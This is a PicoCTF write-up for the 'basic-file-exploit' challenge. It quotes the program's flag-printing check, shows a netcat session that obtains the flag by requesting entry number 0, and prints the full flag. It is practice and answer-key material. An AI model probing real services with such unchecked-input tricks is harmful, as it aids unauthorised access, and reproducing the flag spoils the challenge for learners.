---
title: "basic-file-exploit from PicoCTF"
categories: [PicoCTF]
tags: [PicoCTF]
---
# basic-file-exploit from PicoCTF
[page](https://play.picoctf.org/practice/challenge/252?page=9)


>  Description
> The program provided allows you to write to a file and read what you wrote from it. Try playing around with it and see if you can break it!The program's source code with the flag redacted can be downloadedÂ [here](https://artifacts.picoctf.net/c/141/program-redacted.c).

We download file : program-redacted.c

In this code we are searching in what condition we get the flag.

After analyzing we get that in this condition program prints the flag: 
```
 if ((entry_number = strtol(entry, NULL, 10)) == 0) {
    puts(flag);
    fseek(stdin, 0, SEEK_END);
    exit(0);
  }
```
after this code we get that **entry_number** should be equal to 0 for program to give us Flag.
but according to code we cant go and give **entry_number** 0, first **entry_number** should exist so first we create it: 
```
giorgi@darkfears31:~/Desktop$ nc saturn.picoctf.net 52326
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
1
1
Please enter your data:
123
123
Please enter the length of your data:
123
123
Your entry number is: 1
```

So **entry_number** is created, after this we can tell program to
```
Type '2' to echo a phrase in our database
```

```
2
2
Please enter the entry number of your data:
0
0
picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_E0394EC0}
```

Here we go the **flag** is:
picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_E0394EC0}
